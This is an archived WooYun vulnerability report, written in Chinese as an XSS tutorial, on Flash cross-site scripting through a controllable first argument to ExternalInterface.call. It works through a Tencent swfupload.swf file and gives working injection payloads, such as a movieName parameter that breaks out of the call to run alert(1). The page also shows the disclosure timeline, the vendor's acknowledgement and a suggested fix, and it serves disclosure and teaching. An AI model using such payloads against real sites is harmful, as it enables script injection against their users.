@@ -1,0 +1,435 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-26 14:55</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-15：	细节向普通白帽子公开<br/>
+									2013-01-25：	细节向实习白帽子公开<br/>
+									2013-02-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">除了上一节讲到的navigateToURL/getURL之外呢，另一个经常存在XSS缺陷的as函数就是ExternalInterface.call，此函数作为FLASH与宿主页面javascript通信的接口，一般来说，有“2”个参数，第一个参数为所调用js函数名，后续的其他参数则为所调用的js函数的参数。那么在参数可控的情况下，不论是第一个参数或是后续参数可控，我们均能加以利用实现XSS。本节先说一说第一个参数可控的情况。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 先从程序员的角度说下基础知识，有时候，我们需要在FLASH里调用当前页面中的javascript函数，例如：一个简单的需求，我们要在游戏加载完成后，执行弹出1的操作。<br />
+<br />
+<br />
+<br />
+javascript代码:<br />
+<br />
+<br />
+<br />
+</p><pre><code>alert(1)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+as代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.call(&quot;alert&quot;,&quot;1&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 有的程序员就会觉得，直接弹出1太丑了吧。于是他自己写个js的函数<br />
+<br />
+<br />
+<br />
+</p><pre><code>function myalert(str){<br />
+    //显示一个漂亮的浮动层，并且把str显示在上面。<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后在as里<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.call(&quot;myalert&quot;,&quot;1&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3. 又有一天，另外一个程序员觉得上面那个程序员写的东西不错，但是他的JS函数名不叫myalert，于是喊那个程序员改下as代码。于是那个程序员觉得，免得以后老是有人喊我改代码，他就将代码写成了下面这个样子。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var func:String=root.loaderInfo.parameters.func; //接受FLASH所带的func参数<br />
+ExternalInterface.call(func,&quot;1&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这样一来，其他想用这个FLASH的人，不需要修改FLASH，只需要调用FLASH的时候带上参数即可。<br />
+<br />
+<br />
+<br />
+比如我的JS函数是newalert, 我只需要按照下面这么调用：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://some.com/xxx.swf?func=newalert</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 上述过程提高了程序的可重用性，为开发人员带来了极大的便利，但是却是缺乏安全考虑的。<br />
+<br />
+<br />
+<br />
+攻击者可以采用以下的方式来执行自己的代码<br />
+<br />
+<br />
+<br />
+http://some.com/xxx.swf?func=(function(){alert(&quot;hi jack&quot;)})<br />
+<br />
+<br />
+<br />
+5. 为了方便理解，我们可以将<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.call(&quot;函数名&quot;,&quot;参数1&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看成JS里的<br />
+<br />
+<br />
+<br />
+</p><pre><code>函数名(&quot;参数1&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+而FLASH里实际最后执行的JS代码，形式如下（至于下面这句哪里来的，暂时不表）：<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(函数名(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+因而 函数名 部分也可以写为  (function(){alert(&quot;hi jack&quot;)}) 的形式。<br />
+<br />
+<br />
+<br />
+6. 上面说的是理论基础，有了这个基础，我们来看实例，就比较简单了。<br />
+<br />
+<br />
+<br />
+http://quan.qq.com/swf/swfupload.swf<br />
+<br />
+<br />
+<br />
+7. 怎么反编译，见上一篇。我们来看怎么查找缺陷。<br />
+<br />
+<br />
+<br />
+8. 因为这是一个AS3.0的FLASH文件，我们首先确定FLASH是否有接受参数。<br />
+<br />
+<br />
+<br />
+   as3.0 接受参数的方法，所有参数存放在 root.loaderInfo.parameters 对象里。<br />
+<br />
+<br />
+<br />
+   例如 aaa.swf?a=1&amp;b=2&amp;c=3,<br />
+<br />
+<br />
+<br />
+   那么  root.loaderInfo.parameters 则等于<br />
+<br />
+<br />
+<br />
+   {<br />
+<br />
+      &quot;a&quot;:1,<br />
+<br />
+      &quot;b&quot;:2,<br />
+<br />
+      &quot;c&quot;:3<br />
+<br />
+   }<br />
+<br />
+9. 我们可以定位到 movieName变量<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26125003260b60b77a06157b591dd59f0983802c.jpg" target="_blank"><img src="../images/26125003260b60b77a06157b591dd59f0983802c.jpg" alt="76.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看出，FLASH的movieName参数，存放到了this.movieName中。<br />
+<br />
+<br />
+<br />
+10.进一步， this.movieName被带入了到了this.flashReady_Callback及其它变量。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2612504437ca8c7fecb2736c72074c7cd554337b.jpg" target="_blank"><img src="../images/2612504437ca8c7fecb2736c72074c7cd554337b.jpg" alt="77.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>this.flashReady_Callback = ((&quot;SWFUpload.instances[\&quot;&quot; + this.movieName) + &quot;\&quot;].flashReady&quot;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+11. 我们再进一步看看，this.flashReady_Callback 被用到了哪里。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26125057bf924dad55bd2f36a02426d6d1ae9f5c.jpg" target="_blank"><img src="../images/26125057bf924dad55bd2f36a02426d6d1ae9f5c.jpg" alt="78.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+12. 再接着看看调用 this.flashReady_Callback 的Simple函数是啥样子的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2612511079a8b1b336bdc14d335920ddba3361e9.jpg" target="_blank"><img src="../images/2612511079a8b1b336bdc14d335920ddba3361e9.jpg" alt="79.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，最终这个参数被放到 ExternalInterface.call 的第一个参数中执行了。<br />
+<br />
+<br />
+<br />
+13. 是不是很激动。我们来假设一下，按下面调用FLASH<br />
+<br />
+<br />
+<br />
+http://quan.qq.com/swf/swfupload.swf?movieName=aaaaaaaa<br />
+<br />
+<br />
+<br />
+那么this.flashReady_Callback就等于以下内容。<br />
+<br />
+<br />
+<br />
+SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady<br />
+<br />
+<br />
+<br />
+最终调用的是<br />
+<br />
+<br />
+<br />
+ExternalInterface.call(&#039;SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady&#039;);<br />
+<br />
+<br />
+<br />
+14. 如果我们要调用自己的JS代码，就需要构造闭合，但是你会发现有一定问题。。<br />
+<br />
+<br />
+<br />
+我们最多能够造成下面的模样。<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.call(&#039;SWFUpload.instances[&quot;aaa&quot;];function SWFUpload(){};SWFUpload[&quot;aaa&quot;].flashReady&#039;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但是这样是无法正确执行的，因为 SWFUpload.instances没有被定义，从而SWFUpload.instances[&quot;aaa&quot;]会失败。<br />
+<br />
+<br />
+<br />
+15. 怎么办呢？这里就要拿出我们第5步里的知识了。我们把“函数名”换成call的第一个参数内容。变成下面的形式。<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(SWFUpload.instances[&quot;aaaaaaaa&quot;].flashReady(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们再基于以上代码来构造，<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(SWFUpload.instances[&quot;aaa&quot;])}catch(e){alert(1)};//&quot;].flashReady(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+图片解析:<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26125125e32dcdce4cfc138e74f406c5a5d84a26.jpg" target="_blank"><img src="../images/26125125e32dcdce4cfc138e74f406c5a5d84a26.jpg" alt="80.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上面一行不好看懂的话，写的好看点。<br />
+<br />
+<br />
+<br />
+</p><pre><code>try {<br />
+	__flash__toXML(SWFUpload.instances[&quot;aaa&quot;])   //此行代码，因为SWFUpload未定义，出错，跳转到catch部分<br />
+}catch(e){<br />
+	alert(1); //这里将会被执行。<br />
+};<br />
+<br />
+//&quot;].flashReady(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+16. 最后，我们把构造的代码，放进FLASH的参数里<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://quan.qq.com/swf/swfupload.swf?movieName=aaa&quot;])}catch(e){alert(1)};//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到成功执行alert(1)<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26125141b7d603d09ac33670457c902dc293898d.jpg" target="_blank"><img src="../images/26125141b7d603d09ac33670457c902dc293898d.jpg" alt="81.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对传入call的字符串进行判断或过滤操作。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016532" title="[腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-26 16:13</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16532";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
